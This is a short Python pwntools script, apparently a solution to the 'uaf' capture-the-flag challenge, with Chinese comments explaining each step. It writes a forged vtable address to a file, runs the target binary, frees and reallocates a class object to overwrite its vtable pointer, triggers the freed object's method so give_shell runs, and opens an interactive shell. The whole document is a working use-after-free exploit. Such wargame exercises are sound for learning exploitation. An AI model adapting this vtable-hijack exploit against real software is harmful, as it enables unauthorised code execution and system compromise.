# coding: utf-8
from pwn import *

# 虚表第一项放着give_shell的地址，第二项放着introduce函数的地址
# 源代码会调用introduce，我们写入虚表地址-8，实际将调用give_shell
open('input', 'wb').write(p64(0x401590 - 8))

p = process(['/home/uaf/uaf', '16', 'input'])
pause()

p.sendlineafter(b'free\n', b'3') # free class
p.sendlineafter(b'free\n', b'2') # new chunk
p.sendlineafter(b'free\n', b'2') # new chunk，修改class虚表指针
p.sendlineafter(b'free\n', b'1') # call class function，利用源码中class释放掉后还可以调用的漏洞

p.interactive()